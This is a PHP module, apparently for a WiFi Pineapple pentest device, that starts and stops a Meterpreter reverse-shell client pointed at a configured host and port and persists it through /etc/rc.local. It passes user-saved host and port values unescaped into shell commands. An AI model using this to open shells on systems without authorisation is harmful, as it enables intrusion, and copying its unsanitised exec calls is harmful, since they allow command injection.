<?php namespace pineapple;

class Meterpreter extends Module
{
  public function route()
  {
    switch ($this->request->action) {
      case 'getState':
      $this->getState();
      break;

      case 'startMeterpreter':
      $this->startMeterpreter();
      break;

      case 'stopMeterpreter':
      $this->stopMeterpreter();
      break;

      case 'enableMeterpreter':
      $this->enableMeterpreter();
      break;

      case 'disableMeterpreter':
      $this->disableMeterpreter();
      break;

      case 'saveConfig':
      $this->saveConfig();
      break;
    }
  }

  private function getState()
  {
    if (!file_exists("/etc/config/meterpreter")) {
      exec("touch /etc/config/meterpreter");
    }

    $this->response = array(
      "success" => true,
      "running" => $this->checkRunning('meterpreter'),
      "enabled" => $this->uciGet("meterpreter.autostart"),
      "config" => $this->getConfig()
    );
  }

  private function startMeterpreter()
  {
    $host = $this->uciGet("meterpreter.host");
    $port = $this->uciGet("meterpreter.port");
    $this->execBackground("meterpreter $host $port");
    $this->response = array("success" => true);
  }

  private function stopMeterpreter()
  {
    exec("killall meterpreter");
    $this->response = array("success" => true);
  }

  private function enableMeterpreter()
  {
    $host = $this->uciGet("meterpreter.host");
    $port = $this->uciGet("meterpreter.port");
    exec("sed -i '1i /usr/bin/pineapple/meterpreter $host $port & # inserted by meterpreter module' /etc/rc.local");
    $this->uciSet("meterpreter.autostart", true);
    $this->response = array("success" => true);
  }

  private function disableMeterpreter()
  {
    exec("sed -i '/meterpreter/d' /etc/rc.local");
    $this->uciSet("meterpreter.autostart", false);
    $this->response = array("success" => true);
  }

  private function getConfig()
  {
    return array(
      "host" => $this->uciGet("meterpreter.host"),
      "port" => $this->uciGet("meterpreter.port")
    );
  }

  private function saveConfig()
  {
    $args = $this->request->params;
    $this->uciSet("meterpreter.host", $args->host);
    $this->uciSet("meterpreter.port", $args->port);
    $this->toggleMeterpreter(); //resets rc.local to new settings in autostart is enabled
    $this->response = array("success" => true, "args"=> $args);
  }

  private function toggleMeterpreter()
  {
    $enabled = $this->uciGet("meterpreter.autostart");
    if ($enabled == "1") {
      $this->disableMeterpreter();
      $this->enableMeterpreter();
    }
  }
}
